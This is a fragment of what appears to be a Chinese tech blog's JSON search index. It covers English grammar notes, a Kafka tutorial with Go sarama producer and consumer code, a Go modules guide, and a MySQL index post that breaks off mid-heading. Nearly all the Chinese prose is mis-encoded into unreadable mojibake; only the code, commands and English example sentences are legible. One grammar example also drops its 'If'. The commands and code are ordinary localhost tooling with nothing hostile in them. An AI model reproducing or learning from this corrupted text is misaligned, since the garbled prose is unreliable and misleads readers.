æ¡ä»¶çŠ¶è¯­ä»å¥\n\nå‡è®¾ä¸€ä»¶ä¸å¯èƒ½å‘ç”Ÿçš„äº‹æƒ…(æˆ‘æ˜¯ä¸ªå¥³çš„?) -> è™šæ‹Ÿè¯­æ°”\n\n+ æ¡ä»¶çŠ¶è¯­ä»å¥(ä¸»å°†ä»ç°)\n\nIf it rains, the event will be canceled.\n\n+ è™šæ‹Ÿè¯­æ°”\n\n  + ç°åœ¨ä¸å¯èƒ½(ä¸€èˆ¬è¿‡å»æ—¶)\n\n    If i were a girl, i would be a soldier.\n\n  + è¿‡å»ä¸å¯èƒ½(è¿‡å»å®Œæˆæ—¶)\n\n    I had studied English, it would have been easier now.\n\n\n\n\n\n\n\n# äº”. æ—¶æ€\n\n\n\nä¸€èˆ¬(ä¹ æƒ¯æ€§) \n\n+ ç°åœ¨\n+ è¿‡å»\n+ å°†æ¥\n\nè¿›è¡Œ(æ­£åœ¨å‘ç”Ÿ)\n\n+ ç°åœ¨\n+ è¿‡å»\n+ æœªæ¥\n\nå®Œæˆ(æœ‰ç»“æœ,é€ æˆäº†å½±å“)\n\n+ ç°åœ¨(å¯¹ç°åœ¨æœ‰å½±å“)\n+ è¿‡å»(å¯¹æ˜¨å¤©æœ‰å½±å“)\n+ å°†æ¥(å¯¹æ˜å¤©æœ‰å½±å“)\n\n\n\n# å…­. è¯­æ€\n\n### 5.1 ä¸»åŠ¨è¯­æ€\n\nI finished my task.\n\n### 5.2 è¢«åŠ¨è¯­æ€(Be åŠ¨è¯+ åŠ¨è¯è¿‡å»åˆ†è¯)\n\nMy task is finished.\n\n\n\n# ä¸ƒ. éè°“è¯­\n\nä¸æ˜¯è°“è¯­, ä½†æ˜¯å’ŒåŠ¨ä½œæœ‰å…³ç³»(åŠ¨è¯åˆ†è¯), åƒæ˜¯å¼•å¯¼è¯\n\nåˆ†è¯\n\n+ ç°åœ¨åˆ†è¯(doing) ä¸»åŠ¨å…³ç³»åšäº†\n\n+ è¿‡å»åˆ†è¯(done) è¢«åŠ¨å…³ç³»åšäº†\n\n  \n\n+ The boy was lost, failing to find the way back here.\n+ The boy was lost, failed by his poor memory.\n\n\n\n\n\n# å…«. è‹±è¯­å¥å­æˆåˆ†\n\n+ ä¸€ä¸ªå¥å­æœ€æœ€åŸºæœ¬çš„æˆåˆ†æ˜¯ä¸»è¯­å’Œè°“è¯­,äºŒè€…ç¼ºä¸€ä¸å¯,å¦åˆ™å°±ä¸æ˜¯å®Œæ•´çš„å¥å­.\n+ ä¸»è¯­å¯ä»¥ç®€å•çš„ç†è§£æˆåè¯, è°“è¯­å¯ä»¥ç®€å•ç†è§£ä¸ºåŠ¨è¯\n+ å®¾è¯­ä¸€èˆ¬ä¹Ÿæ˜¯åè¯, å¥å­æ‰¿å—è€…\n+ å®šè¯­ç®€å•ç†è§£ä¸ºå½¢å®¹è¯\n+ è¡¨è¯­, å¸¸è§ç³»è¡¨ç»“æ„, é€šå¸¸ä¹Ÿæ˜¯å½¢å®¹è¯\n+ çŠ¶è¯­ç®€å•ç†è§£ä¸ºå‰¯è¯, è¯´æ˜åœ°ç‚¹ã€æ—¶é—´ã€åŸå› ã€ç›®çš„ã€ç»“æœã€æ¡ä»¶ã€æ–¹å‘ã€ç¨‹åº¦ã€æ–¹å¼å’Œä¼´éšçŠ¶å†µç­‰ã€‚ \n\n","tags":["english"],"categories":["è‹±è¯­"]},{"title":"kafkaä»‹ç»å’Œä½¿ç”¨","url":"%2Fp%2Ff03714cc.html","content":"\n# 1. kafkaä»‹ç»\n\n\nKafka æ˜¯ linkedin ç”¨äºæ—¥å¿—å¤„ç†çš„åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—ï¼ŒåŒæ—¶æ”¯æŒç¦»çº¿å’Œåœ¨çº¿æ—¥å¿—å¤„ç†ã€‚kafka å¯¹æ¶ˆæ¯ä¿å­˜æ—¶æ ¹æ® Topic è¿›è¡Œå½’ç±»ï¼Œå‘é€æ¶ˆæ¯è€…æˆä¸º Producer,æ¶ˆæ¯æ¥å—è€…æˆä¸º Consumer,æ­¤å¤– kafka é›†ç¾¤æœ‰å¤šä¸ª kafka å®ä¾‹ç»„æˆï¼Œæ¯ä¸ªå®ä¾‹(server)ç§°ä¸º brokerã€‚æ— è®ºæ˜¯ kafkaé›†ç¾¤ï¼Œè¿˜æ˜¯ producer å’Œ consumer éƒ½ä¾èµ–äº zookeeper æ¥ä¿è¯ç³»ç»Ÿå¯ç”¨æ€§ï¼Œä¸ºé›†ç¾¤ä¿å­˜ä¸€äº› meta ä¿¡æ¯ã€‚\n\n<!-- more -->\n\n### 1.1 redis æ¶ˆæ¯è®¢é˜…å’Œå‘å¸ƒçš„åŒºåˆ«\n\nè€æ¿æœ‰ä¸ªå¥½æ¶ˆæ¯è¦å‘Šè¯‰å¤§å®¶ï¼Œæœ‰ä¸¤ä¸ªåŠæ³•:\n1.åˆ°æ¯ä¸ªåº§ä½ä¸ŠæŒ¨ä¸ªå„¿å‘Šè¯‰æ¯ä¸ªäººã€‚ä»€ä¹ˆï¼Ÿå¼ ä¸‰å»ä¸Šå•æ‰€äº†ï¼Ÿé‚£å¼ ä¸‰å°±åªèƒ½é”™è¿‡å¥½æ¶ˆæ¯äº†ï¼\n2.è€æ¿æŠŠæ¶ˆæ¯å†™åˆ°é»‘æ¿æŠ¥ä¸Šï¼Œè°æƒ³çŸ¥é“å°±æ¥çœ‹ä¸€ä¸‹ï¼Œä»€ä¹ˆï¼Ÿå¼ ä¸‰è¯·å‡äº†ï¼Ÿæ²¡å…³ç³»ï¼Œæˆ‘ä¸€å‘¨ä¹‹åæ‰æ“¦æ‰ï¼Œæ€»ä¼šçœ‹è§çš„ï¼ä»€ä¹ˆå¼ ä¸‰è¯·å‡ä¸¤å‘¨ï¼Ÿé‚£å°±ç®—äº†ï¼Œæˆ‘åæ­£åªä¿ç•™ä¸€å‘¨ï¼Œä¸ç„¶å…¶ä»–å¥½æ¶ˆæ¯æ²¡åœ°æ–¹å†™äº†\n\nredisç”¨ç¬¬ä¸€ç§åŠæ³•ï¼Œkafkaç”¨ç¬¬äºŒç§åŠæ³•ï¼ŒçŸ¥é“ä»€ä¹ˆåŒºåˆ«äº†å§\n\n\n\n# 2. å®‰è£…å’Œä½¿ç”¨\n\n### 2.1 mac\n\n```bash\nbrew install kafka  # å¦‚æœæŠ¥é”™ï¼Œæç¤ºå®‰è£… java, å®‰è£…å³å¯\n\nzookeeper-server-start /usr/local/etc/kafka/zookeeper.properties & kafka-server-start /usr/local/etc/kafka/server.properties  # ä¸´æ—¶å¯åŠ¨ï¼Œå…ˆå¯åŠ¨ zookeeper, å†å¯åŠ¨ kafaka\n\n# æ­¤æ—¶ç”¨ ps æŸ¥çœ‹è¿›ç¨‹å¯ä»¥çœ‹åˆ°æ˜¯ç”¨ java èµ·æ¥çš„ã€‚\n```\n\n### 2.3 ä½¿ç”¨\n\nåˆ›å»ºTopic\n\n```bash\nkafka-topics --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test\n```\n\näº§ç”Ÿæ¶ˆæ¯\n\n```bash\nkafka-console-producer --broker-list localhost:9092 --topic test\n```\n\næ¶ˆè´¹\n\n```bash\nkafka-console-consumer --bootstrap-server localhost:9092 --topic test --from-beginning\n```\n\nå¦‚æœä½¿ç”¨æ¶ˆè´¹ç»„\n\n```bash\nkafka-console-consumer --bootstrap-server localhost:9092 --topic test --group test-consumer1 --from-beginning\n```\n\n\n\n# 3.  golang ä½¿ç”¨ kafka\n\ngithub ä¸Šæœ‰å¤šä¸ªè½®å­,é€‰ç”¨äº†staræœ€å¤šçš„ sarama\n\n+ https://github.com/Shopify/sarama \n+ https://github.com/confluentinc/confluent-kafka-go\n\n### 3.1 ç”Ÿäº§è€…\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\nfunc main() {\n\tconfig := sarama.NewConfig()\n\tconfig.Producer.RequiredAcks = sarama.WaitForAll          // å‘é€å®Œæ•°æ®éœ€è¦leaderå’Œfollowéƒ½ç¡®è®¤\n\tconfig.Producer.Partitioner = sarama.NewRandomPartitioner // æ–°é€‰å‡ºä¸€ä¸ªpartition\n\tconfig.Producer.Return.Successes = true                   // æˆåŠŸäº¤ä»˜çš„æ¶ˆæ¯å°†åœ¨success channelè¿”å›\n\n\t// è¿æ¥kafka\n\tclient, err := sarama.NewSyncProducer([]string{\"127.0.0.1:9092\"}, config)\n\tif err != nil {\n\t\tfmt.Println(\"producer closed, err:\", err)\n\t\treturn\n\t}\n\tdefer client.Close()\n\t\n\t// å‘é€æ¶ˆæ¯\n\tmsg := &sarama.ProducerMessage{}\n\tmsg.Topic = \"web_log\"\n\tmsg.Value = sarama.StringEncoder(\"this is a test log1\")\n\tpid, offset, err := client.SendMessage(msg)\n\tif err != nil {\n\t\tfmt.Println(\"send msg failed, err:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"pid:%v offset:%v\\n\", pid, offset)\n}\n\n\n```\n\n### 3.2 æ¶ˆè´¹è€…\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\nfunc main() {\n\tconsumer, err := sarama.NewConsumer([]string{\"localhost:9092\"}, nil)\n\tif err != nil {\n\t\tfmt.Printf(\"fail to start consumer, err:%v\\n\", err)\n\t\treturn\n\t}\n\n\t// å–å‡ºè€çš„å€¼\n\toldest, _ := consumer.ConsumePartition(\"web_log\", 0, sarama.OffsetOldest)\n\tdefer oldest.AsyncClose()\n\tfor msg := range oldest.Messages() {\n\t\tfmt.Printf(\"Partition:%d Offset:%d Key:%v Value:%v\\n\", msg.Partition, msg.Offset, string(msg.Key), string(msg.Value))\n\t}\n\t\n\t// æ¶ˆè´¹æ–°å¢åŠ çš„å€¼\n\tnewest, _ := consumer.ConsumePartition(\"web_log\", 0, sarama.OffsetNewest)\n\tdefer newest.AsyncClose()\n\tfor msg := range newest.Messages() {\n\t\tfmt.Printf(\"Partition:%d Offset:%d Key:%v Value:%v\\n\", msg.Partition, msg.Offset, string(msg.Key), string(msg.Value))\n\t}\n}\n```\n\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://colobu.com/2019/09/27/install-Kafka-on-Mac/\n","tags":["kafka"],"categories":["ä¸­é—´ä»¶"]},{"title":"go-moduleçš„ä½¿ç”¨","url":"%2Fp%2F6c6632b7.html","content":"\n\n\ngolangä»è¯ç”Ÿä¹‹åˆå°±ä¸€ç›´æœ‰ä¸ªè¢«è¯Ÿç—…çš„é—®é¢˜ï¼šç¼ºå°‘ä¸€ä¸ªè¡Œä¹‹æœ‰æ•ˆçš„â€œå®˜æ–¹â€åŒ…ä¾èµ–ç®¡ç†å·¥å…·ã€‚ä¹‹å‰golangåŒ…ç®¡ç†å·¥å…·æœ‰æ•°åä¸ªï¼Œ è¯´å®è¯éƒ½ä¸æ˜¯è®©äººéå¸¸æ»¡æ„ã€‚\n\ngo 1.11 æœ‰äº†å¯¹æ¨¡å—çš„å®éªŒæ€§æ”¯æŒï¼Œå¤§éƒ¨åˆ†çš„å­å‘½ä»¤éƒ½çŸ¥é“å¦‚ä½•å¤„ç†ä¸€ä¸ªæ¨¡å—ï¼Œæ¯”å¦‚ run build install get list mod å­å‘½ä»¤ã€‚go 1.12 ä¼šåˆ é™¤å¯¹ GOPATH çš„æ”¯æŒï¼Œgo get å‘½ä»¤ä¹Ÿä¼šå˜æˆåªèƒ½è·å–æ¨¡å—ï¼Œä¸èƒ½åƒç°åœ¨è¿™æ ·ç›´æ¥è·å–ä¸€ä¸ªè£¸åŒ…ã€‚\n\n\n\n\n\nå¯ä»¥ç”¨ç¯å¢ƒå˜é‡ GO111MODULE å¼€å¯æˆ–å…³é—­æ¨¡å—æ”¯æŒï¼Œå®ƒæœ‰ä¸‰ä¸ªå¯é€‰å€¼ï¼šoffã€onã€autoï¼Œé»˜è®¤å€¼æ˜¯ autoã€‚\n\n- GO111MODULE=off æ— æ¨¡å—æ”¯æŒï¼Œgo ä¼šä» GOPATH å’Œ vendor æ–‡ä»¶å¤¹å¯»æ‰¾åŒ…ã€‚\n- GO111MODULE=on æ¨¡å—æ”¯æŒï¼Œgo ä¼šå¿½ç•¥ GOPATH å’Œ vendor æ–‡ä»¶å¤¹ï¼Œåªæ ¹æ® go.mod ä¸‹è½½ä¾èµ–ã€‚\n- GO111MODULE=auto åœ¨ $GOPATH/src å¤–é¢ä¸”æ ¹ç›®å½•æœ‰ go.mod æ–‡ä»¶æ—¶ï¼Œå¼€å¯æ¨¡å—æ”¯æŒã€‚\n\nåœ¨ä½¿ç”¨æ¨¡å—çš„æ—¶å€™ï¼ŒGOPATH æ˜¯æ— æ„ä¹‰çš„ï¼Œä¸è¿‡å®ƒè¿˜æ˜¯ä¼šæŠŠä¸‹è½½çš„ä¾èµ–å‚¨å­˜åœ¨ $GOPATH/pkg/mod ä¸­ï¼Œä¹Ÿä¼šæŠŠ go install çš„ç»“æœæ”¾åœ¨ $GOPATH/bin ä¸­ã€‚\n\n<!-- more -->\n\n### 1. go mod ä½¿ç”¨æ•™ç¨‹\n\nhttps://github.com/golang/go/wiki/Modules # å®˜æ–¹wiki, åŸºæœ¬æ‰€æœ‰çš„é—®é¢˜éƒ½èƒ½åœ¨è¿™é‡Œæ‰¾åˆ°\n\n\n\n##### 1.1 åœ¨ä½¿ç”¨å‰å…ˆç¡®ä¿golangå‡çº§åˆ°1.11:\n\nhttps://golang.org/dl/ #ä¸‹è½½golang\n\n\n\n### 2. ä½¿ç”¨go mod å®è·µ\n\n\n\n##### 2.1. å¿«é€Ÿå¼€å§‹ï¼š\n\n1. æŠŠä¹‹å‰çš„å·¥ç¨‹æ‹·è´åˆ°$GOPATH/srcä¹‹å¤–\n\n2. åœ¨å·¥ç¨‹ç›®å½•ä¸‹æ‰§è¡Œï¼šgo mod init {module name}ï¼Œè¯¥å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ªgo.modæ–‡ä»¶\n\n3. ç„¶ååœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œ go buildï¼Œå°±å¯ä»¥äº†ï¼Œgo.modä¸­è®°å½•äº†ä¾èµ–åŒ…åŠå…¶ç‰ˆæœ¬å·ã€‚\n\n   \n\n##### 2.2. åœ¨ go build ä¸­ é‡åˆ°äº†ä»¥ä¸‹å‡ ä¸ªé—®é¢˜, è®°å½•å¦‚ä¸‹:\n\n\n\n2.2.1 golang.orgçš„åŒ…ç«Ÿç„¶ä¸‹ä¸ä¸‹æ¥(ä½ æ‡‚çš„)\n\nå¯ä»¥ä½¿ç”¨åœ¨go.modé‡Œæ·»åŠ replaceé€‰é¡¹\n\n```go\nreplace (golang.org/x/text => github.com/golang/text v0.3.0 )\n```\n\n ä¹Ÿå¯ä»¥ç”¨ä»£ç†çš„æ–¹å¼, æ›´åŠ æ–¹ä¾¿\n\n```shell\nexport GOPROXY=https://athens.azurefd.net\n```\n\n\n\n2.2.2 å‘ç°æ‰¾ä¸åˆ°åŒ…(åŒ…å±‚çº§å¤šçš„)\n\ncannot load github.com/aliyun/alibaba-cloud-sdk-go/sdk: cannot find module providing package github.com/aliyun/alibaba-cloud-sdk-go/sdk\n\n```shell\ngo get github.com/aliyun/alibaba-cloud-sdk-go@master  #å¸¦@master\n```\n\n\n\n2.2.3 åœ¨æ›¿æ¢çš„æ—¶å€™è¿˜å‘ç°è¿™ä¸ªé”™è¯¯\n\ncannot call non-function xurls.Strict (type *regexp.Regexp)\n\n```shell\nmvdan.cc/xurls  #ä¹‹å‰ç”¨çš„æ˜¯è¿™ä¸ªç‰ˆæœ¬,æ¢æˆä¸‹é¢çš„å°±å¯ä»¥äº†\nmvdan.cc/xurls/v2\n```\n\n\n\n2.2.4  åªæœ‰ç›´æ¥ä½¿ç”¨çš„ä¾èµ–ä¼šè¢«è®°å½•åœ¨`go.mod`æ–‡ä»¶ä¸­, è´´å‡ºgo.modçš„å†…å®¹å¦‚ä¸‹:\n\n```go\nmodule github.com/unix2dos/goods-notify\n\n\n\ngo 1.12\n\n\n\nrequire (\n\n\tgithub.com/PuerkitoBio/goquery v1.5.0\n\n\tgithub.com/aliyun/alibaba-cloud-sdk-go v0.0.0-20190528035818-94084c920892\n\n\tgithub.com/gorilla/websocket v1.4.0 // indirect\n\n\tgithub.com/joho/godotenv v1.3.0\n\n\tgithub.com/pkg/errors v0.8.1 // indirect\n\n\tgithub.com/stretchr/testify v1.3.0\n\n\tgithub.com/unix2dos/bearychat-go v0.0.0-20190222142113-d09d4a5e73e5\n\n\tgithub.com/valyala/fasthttp v1.3.0\n\n\tgithub.com/yunpian/yunpian-go-sdk v0.0.0-20171206021512-2193bf8a7459\n\n\tgolang.org/x/text v0.3.2\n\n\tmvdan.cc/xurls/v2 v2.0.0\n\n)\n```\n\n\n\n`indirect` æ³¨é‡Šæ ‡è®°äº†ä¾èµ–ä¸æ˜¯è¢«å½“å‰æ¨¡å—ç›´æ¥ä½¿ç”¨çš„ï¼Œåªæ˜¯åœ¨å…¶ä»–ä¾èµ–é¡¹ä¸­è¢«é—´æ¥å¼•ç”¨ã€‚\n\n\n\n2.2.5  go.sumæ–‡ä»¶ä»‹ç»\n\nåŒæ—¶ï¼Œ`go.mod`å’Œ`go`å‘½ä»¤ç»´æŠ¤äº†ä¸€ä¸ªåå«`go.sum`çš„æ–‡ä»¶åŒ…å«äº†æŒ‡å®šæ¨¡å—ç‰ˆæœ¬çš„æœŸæœ›çš„[åŠ å¯†hash](https://golang.org/cmd/go/#hdr-Module_downloading_and_verification)ï¼š\n\n`go`å‘½ä»¤ä½¿ç”¨`go.sum`æ–‡ä»¶ä¿è¯ä¹‹åçš„æ¨¡å—ä¸‹è½½ä¼šä¸‹è½½åˆ°è·Ÿç¬¬ä¸€æ¬¡ä¸‹è½½ç›¸åŒçš„æ–‡ä»¶å†…å®¹ï¼Œä¿è¯ä½ çš„é¡¹ç›®ä¾èµ–ä¸ä¼šå‘ç”Ÿé¢„æœŸå¤–çš„æ¶æ„ä¿®æ”¹ã€æ„å¤–é—®é¢˜å’Œå…¶ä»–é—®é¢˜ã€‚`go.mod` å’Œ `go.sum`éƒ½éœ€è¦æ”¾è¿›ç‰ˆæœ¬ç®¡ç†ä¸­ã€‚\n\n\n\n### 3. go mod ç›¸å…³æ“ä½œ\n\n`go list -m all`  å¯ä»¥æŸ¥çœ‹å½“å‰çš„ä¾èµ–å’Œç‰ˆæœ¬(å½“å‰æ¨¡å—ï¼Œæˆ–è€…å«åšä¸»æ¨¡å—ï¼Œé€šå¸¸æ˜¯ç¬¬ä¸€è¡Œï¼Œæ¥ä¸‹æ¥æ˜¯æ ¹æ®ä¾èµ–è·¯å¾„æ’åºçš„ä¾èµ–)ã€‚\n\n\n\n`go mod edit -fmt` æ ¼å¼åŒ– `go.mod` æ–‡ä»¶ã€‚\n\n\n\n `go mod tidy` ä» `go.mod` åˆ é™¤ä¸éœ€è¦çš„ä¾èµ–ã€æ–°å¢éœ€è¦çš„ä¾èµ–ï¼Œè¿™ä¸ªæ“ä½œä¸ä¼šæ”¹å˜ä¾èµ–ç‰ˆæœ¬ã€‚\n\n\n\n##### 3.1 go get å‘½ä»¤\n\nè·å–ä¾èµ–çš„ç‰¹å®šç‰ˆæœ¬ï¼Œç”¨æ¥å‡çº§å’Œé™çº§ä¾èµ–ã€‚å¯ä»¥è‡ªåŠ¨ä¿®æ”¹ `go.mod` æ–‡ä»¶ï¼Œè€Œä¸”ä¾èµ–çš„ä¾èµ–ç‰ˆæœ¬å·ä¹Ÿå¯èƒ½ä¼šå˜ã€‚åœ¨ `go.mod` ä¸­ä½¿ç”¨ `exclude` æ’é™¤çš„åŒ…ï¼Œä¸èƒ½ `go get` ä¸‹æ¥ã€‚\n\n\n\nä¸ä»¥å‰ä¸åŒçš„æ˜¯ï¼Œæ–°ç‰ˆ `go get` å¯ä»¥åœ¨æœ«å°¾åŠ  `@` ç¬¦å·ï¼Œç”¨æ¥æŒ‡å®šç‰ˆæœ¬ã€‚\n\nå®ƒè¦æ±‚ä»“åº“å¿…é¡»ç”¨ `v1.2.0` æ ¼å¼æ‰“ tagï¼Œåƒ `v1.2` å°‘ä¸ªé›¶éƒ½ä¸è¡Œçš„ï¼Œå¿…é¡»æ˜¯[è¯­ä¹‰åŒ–](https://semver.org/lang/zh-CN/)çš„ã€å¸¦ `v` å‰ç¼€çš„ç‰ˆæœ¬å·ã€‚\n\n\n\n```\ngo get github.com/gorilla/mux           # åŒ¹é…æœ€æ–°çš„ä¸€ä¸ª tag\ngo get github.com/gorilla/mux@latest    # å’Œä¸Šé¢ä¸€æ ·\ngo get github.com/gorilla/mux@v1.6.2    # åŒ¹é… v1.6.2\ngo get github.com/gorilla/mux@e3702bed2 # åŒ¹é… v1.6.2\ngo get github.com/gorilla/mux@c856192   # åŒ¹é… c85619274f5d\ngo get github.com/gorilla/mux@master    # åŒ¹é… master åˆ†æ”¯\n```\n\n\n\n`latest` åŒ¹é…æœ€æ–°çš„ tagã€‚\n\n`v1.2.6` å®Œæ•´ç‰ˆæœ¬çš„å†™æ³•ã€‚\n\n`v1`ã€`v1.2` åŒ¹é…å¸¦è¿™ä¸ªå‰ç¼€çš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¦‚æœæœ€æ–°ç‰ˆæ˜¯ `1.2.7`ï¼Œå®ƒä»¬ä¼šåŒ¹é… `1.2.7`ã€‚\n\n`c856192` ç‰ˆæœ¬ hash å‰ç¼€ã€åˆ†æ”¯åã€æ— è¯­ä¹‰åŒ–çš„æ ‡ç­¾ï¼Œåœ¨ `go.mod` é‡Œéƒ½ä¼šä¼šä½¿ç”¨çº¦å®šå†™æ³• `v0.0.0-20180517173623-c85619274f5d`ï¼Œä¹Ÿè¢«ç§°ä½œä¼ªç‰ˆæœ¬ã€‚\n\n`go get` å¯ä»¥æ¨¡ç³ŠåŒ¹é…ç‰ˆæœ¬å·ï¼Œä½† `go.mod` æ–‡ä»¶åªä½“ç°å®Œæ•´çš„ç‰ˆæœ¬å·ï¼Œå³ `v1.2.0`ã€`v0.0.0-20180517173623-c85619274f5d`ï¼Œåªä¸è¿‡ä¸éœ€è¦æ‰‹å†™è¿™ä¹ˆé•¿çš„ç‰ˆæœ¬å·ï¼Œç”¨ `go get` æˆ–ä¸Šæ–‡çš„ `go mod edit -require` æ¨¡ç³ŠåŒ¹é…å³å¯ï¼Œå®ƒä¼šæŠŠåŒ¹é…åˆ°çš„å®Œæ•´ç‰ˆæœ¬å·å†™è¿› `go.mod`  æ–‡ä»¶ã€‚\n\n\n\n\n\nå‚è€ƒèµ„æ–™:\n\nhttps://github.com/golang/go/wiki/Modules\n\nhttps://www.jianshu.com/p/c5733da150c6\n\nhttps://www.4async.com/2019/03/using-go-modules/","tags":["golang"],"categories":["golang"]},{"title":"mysqlç´¢å¼•ä»‹ç»","url":"%2Fp%2F84544518.html","content":"\n\n\n# 1. ç´¢å¼•\n\n### 1.1 ç´¢å¼•æ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆä½œç”¨ä»¥åŠä¼˜ç¼ºç‚¹ï¼Ÿ\n\n- æ˜¯ä¸€ç§å¿«é€ŸæŸ¥è¯¢è¡¨ä¸­å†…å®¹çš„æœºåˆ¶ï¼Œç±»ä¼¼äºæ–°åå­—å…¸çš„ç›®å½•\n- è¿ç”¨åœ¨è¡¨ä¸­æŸä¸ªäº›å­—æ®µä¸Šï¼Œä½†å­˜å‚¨æ—¶ï¼Œç‹¬ç«‹äºè¡¨ä¹‹å¤–ï¼Œæœ‰ä¸€å¼ ä¸“é—¨çš„ç´¢å¼•è¡¨\n\n<!-- more -->\n\n### 1.2 ä»€ä¹ˆæ—¶å€™è¦åˆ›å»ºç´¢å¼•\n\n- è¡¨ç»å¸¸è¿›è¡Œ SELECT æ“ä½œ\n- è¡¨å¾ˆå¤§(è®°å½•è¶…å¤š)ï¼Œè®°å½•å†…å®¹åˆ†å¸ƒèŒƒå›´å¾ˆå¹¿\n- åˆ—åç»å¸¸åœ¨ WHERE å­å¥æˆ–è¿æ¥æ¡ä»¶ä¸­å‡ºç°\n\n### 1.3 ä»€ä¹ˆæ—¶å€™ä¸è¦åˆ›å»ºç´¢å¼•\n\n- è¡¨ç»å¸¸è¿›è¡Œ INSERT/UPDATE/DELETE æ“ä½œ\n- è¡¨å¾ˆå°(è®°å½•è¶…å°‘)\n- åˆ—åä¸ç»å¸¸ä½œä¸ºè¿æ¥æ¡ä»¶æˆ–å‡ºç°åœ¨ WHERE å­å¥ä¸­\n- å­—æ®µå†…å®¹é‡å¤å¾ˆå¤š\n\n\n\n# 2. ç´¢å¼•åˆ†ç±»\n\n### 2.1 ä»å­˜å‚¨ç»“æ„ä¸Šæ¥åˆ’åˆ†\n\n+ Btree ç´¢å¼•ï¼ˆB+treeï¼ŒB-tree)\n\n- å“ˆå¸Œç´¢å¼•\n\n  å“ˆå¸Œç´¢å¼•ä¸€èˆ¬é€‚ç”¨äºï¼šä¸éœ€è¦åšæ’åº**ã€**èŒƒå›´æŸ¥è¯¢çš„éœ€æ±‚ã€‚\n\n  - å“ˆå¸Œç´¢å¼•åªåŒ…å«å“ˆå¸Œå€¼å’Œè¡ŒæŒ‡é’ˆï¼Œè€Œä¸å­˜å‚¨å­—æ®µå€¼ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨ç´¢å¼•ä¸­çš„å€¼æ¥é¿å…è¯»å–è¡Œã€‚ä¸è¿‡ï¼Œè®¿é—®å†…å­˜ä¸­çš„è¡Œçš„é€Ÿåº¦å¾ˆå¿«ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†æƒ…å†µä¸‹è¿™ä¸€ç‚¹å¯¹æ€§èƒ½çš„å½±å“å¹¶ä¸æ˜æ˜¾ã€‚\n  - å“ˆå¸Œç´¢å¼•æ•°æ®å¹¶ä¸æ˜¯æŒ‰ç…§ç´¢å¼•å€¼é¡ºåºå­˜å‚¨çš„ï¼Œæ‰€ä»¥ä¹Ÿå°±æ— æ³•ç”¨äºæ’åºã€‚\n  - å“ˆå¸Œç´¢å¼•ä¹Ÿä¸æ”¯æŒéƒ¨åˆ†ç´¢å¼•åˆ—åŒ¹é…æŸ¥æ‰¾ï¼Œå› ä¸ºå“ˆå¸Œç´¢å¼•å§‹ç»ˆæ˜¯ä½¿ç”¨ç´¢å¼•åˆ—çš„å…¨éƒ¨å†…å®¹æ¥è®¡ç®—å“ˆå¸Œå€¼çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨æ•°æ®åˆ—(A, B)ä¸Šå»ºç«‹å“ˆå¸Œç´¢å¼•ï¼Œå¦‚æœæŸ¥è¯¢åªæœ‰æ•°æ®åˆ—Aï¼Œåˆ™æ— æ³•ä½¿ç”¨è¯¥ç´¢å¼•ã€‚\n  - å“ˆå¸Œç´¢å¼•åªæ”¯æŒç­‰å€¼æ¯”è¾ƒæŸ¥è¯¢ï¼ŒåŒ…æ‹¬=ã€in()ã€<=>ã€‚ä¸æ”¯æŒä»»ä½•èŒƒå›´æŸ¥è¯¢ï¼Œä¾‹å¦‚where price > 100ã€‚\n  - è®¿é—®å“ˆå¸Œç´¢å¼•çš„æ•°æ®éå¸¸å¿«ï¼Œé™¤éæœ‰å¾ˆå¤šå“ˆå¸Œå†²çªã€‚\n  - å¦‚æœå“ˆå¸Œå†²çªå¾ˆå¤šçš„è¯ï¼Œä¸€äº›ç´¢å¼•ç»´æŠ¤æ“ä½œçš„ä»£ä»·ä¹Ÿå¾ˆé«˜ã€‚\n\n- full-index å…¨æ–‡ç´¢å¼•\n\n- RTree\n\n\n\n### 2.2 ä»åº”ç”¨å±‚æ¬¡ä¸Šæ¥åˆ’åˆ†\n\n- æ™®é€šç´¢å¼•ï¼šå³ä¸€ä¸ªç´¢å¼•åªåŒ…å«å•ä¸ªåˆ—ï¼Œä¸€ä¸ªè¡¨å¯ä»¥æœ‰å¤šä¸ªå•åˆ—ç´¢å¼•ã€‚\n- å”¯ä¸€ç´¢å¼•ï¼šç´¢å¼•åˆ—çš„å€¼å¿…é¡»å”¯ä¸€ï¼Œä½†å…è®¸æœ‰ç©ºå€¼ã€‚\n  + æ™®é€šå”¯ä¸€ç´¢å¼•ï¼šå•ä¸ªå­—æ®µä¸Šå»ºç«‹å”¯ä¸€ç´¢å¼•ï¼Œéœ€è¦æ­¤å­—æ®µæ‰€åœ¨çš„åˆ—ä¸Šä¸èƒ½æœ‰é‡å¤çš„å€¼ï¼Œå±äºäºŒçº§ç´¢å¼•ã€‚\n  + å¤åˆå”¯ä¸€ç´¢å¼•ï¼šå¤šä¸ªå­—æ®µä¸Šè”åˆå»ºç«‹å”¯ä¸€ç´¢å¼•ï¼Œå±äºäºŒçº§ç´¢å¼•ã€‚\n- å¤åˆç´¢å¼•ï¼šä¸€ä¸ªç´¢å¼•åŒ…å«å¤šä¸ªåˆ—ã€‚\n\n\n\n##### 2.2.1 å”¯ä¸€ç´¢å¼•å’Œä¸»é”®ç´¢å¼•åŒºåˆ«\n\n+ ä¸»é”®å°±æ˜¯å”¯ä¸€ç´¢å¼•ï¼Œä½†æ˜¯å”¯ä¸€ç´¢å¼•ä¸ä¸€å®šæ˜¯ä¸»é”®\n\n+ å”¯ä¸€ç´¢å¼•å¯ä»¥ä¸ºç©ºï¼Œä½†æ˜¯ç©ºå€¼åªèƒ½æœ‰ä¸€ä¸ªï¼Œä¸»é”®ä¸èƒ½ä¸ºç©ºã€‚\n\n\n\n### 2.3 